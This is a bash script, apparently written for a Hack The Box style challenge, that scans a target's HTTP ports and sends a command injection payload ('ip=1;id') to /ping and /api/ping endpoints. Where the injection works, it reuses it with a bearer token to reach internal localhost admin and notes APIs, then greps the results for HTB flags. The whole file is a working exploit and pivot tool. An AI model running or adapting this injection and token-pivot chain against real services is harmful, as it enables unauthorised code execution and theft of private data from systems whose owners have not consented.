#!/usr/bin/env bash
set -euo pipefail
# Usage: http_ping_rce_scan.sh <IP> <PRIMARY_PORT> <NMAP_FILE> [TO=8] [OUT_BASE]
IP=${1:?IP}
PRIMARY_PORT=${2:?PRIMARY_PORT}
NMAP_FILE=${3:?NMAP_FILE}
TO=${4:-8}
OUT_BASE=${5:-/workspace/recon/httpx}
SCAN_DIR="$OUT_BASE/${IP}_http_ping"
TMP_DIR=/workspace/recon/tmp
mkdir -p "$SCAN_DIR" "$TMP_DIR"
# Token to pivot if RCE is found
TOKEN_FILE="$OUT_BASE/${IP}_${PRIMARY_PORT}/token.txt"
TOKEN=""
if [[ -s "$TOKEN_FILE" ]]; then TOKEN=$(cat "$TOKEN_FILE"); fi
# 1) Collect HTTP ports (plain HTTP only)
PORTS=$(awk '/\/tcp\s+open\s+http\b/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Add known Node ports just in case
PORTS="$PORTS $PRIMARY_PORT 32271 33930 44825 46530 48656 50692"
PORTS=$(printf '%s\n' $PORTS | awk 'NF' | sort -n | uniq)
printf '%s\n' $PORTS > "$SCAN_DIR/ports.txt"
: > "$SCAN_DIR/rce_ports.txt"
# 2) Probe each port for index and ping endpoints
while read -r p; do
  [[ -z "$p" ]] && continue
  base="http://$IP:$p"
  # Fetch index
  /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -i '$base/' | sed -n '1,80p'" > "$SCAN_DIR/${p}_index.head" 2>/dev/null || true
  # Test /ping GET and POST
  /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -i '$base/ping' | sed -n '1,60p'" > "$SCAN_DIR/${p}_ping_get.head" 2>/dev/null || true
  RES=$(/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode 'ip=1;id' '$base/ping' || true")
  printf '%s\n' "$RES" | head -n 5 > "$SCAN_DIR/${p}_ping_post.txt"
  # Also test /api/ping
  /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -i '$base/api/ping' | sed -n '1,60p'" > "$SCAN_DIR/${p}_apiping_get.head" 2>/dev/null || true
  RES2=$(/workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode 'ip=1;id' '$base/api/ping' || true")
  printf '%s\n' "$RES2" | head -n 5 > "$SCAN_DIR/${p}_apiping_post.txt"
  ALL="$RES
$RES2"
  if echo "$ALL" | grep -qiE 'uid=|www-data|linux'; then
    echo "$p" | tee -a "$SCAN_DIR/rce_ports.txt"
    if [[ -n "$TOKEN" ]]; then
      # 3) Pivot to localhost admin endpoints
      printf "ip=1;curl -s -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/notes/all'" "$TOKEN" "$PRIMARY_PORT" > "$TMP_DIR/inj_${p}_all.txt"
      /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'$TMP_DIR/inj_${p}_all.txt' '$base/ping'" > "$SCAN_DIR/${p}_localhost_all.json" || true
      printf "ip=1;curl -s -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/notes?all=1'" "$TOKEN" "$PRIMARY_PORT" > "$TMP_DIR/inj_${p}_list.txt"
      /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'$TMP_DIR/inj_${p}_list.txt' '$base/ping'" > "$SCAN_DIR/${p}_localhost_list.json" || true
      printf "ip=1;curl -s -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/auth/verify'" "$TOKEN" "$PRIMARY_PORT" > "$TMP_DIR/inj_${p}_verify.txt"
      /workspace/recon/scripts/with_timeout.sh "$TO" -- bash -lc "curl -fsS -m $TO --connect-timeout $TO -s -X POST --data-urlencode ip@'$TMP_DIR/inj_${p}_verify.txt' '$base/ping'" > "$SCAN_DIR/${p}_localhost_verify.json" || true
    fi
  fi
  sleep 0.05
done < "$SCAN_DIR/ports.txt"
# 4) Grep for HTB flags in any pivot output
rg -n "HTB\{[^}]+\}" -S "$SCAN_DIR" | tee "$SCAN_DIR/htb_hits.txt" || true
sed -n '1,200p' "$SCAN_DIR/htb_hits.txt" || true
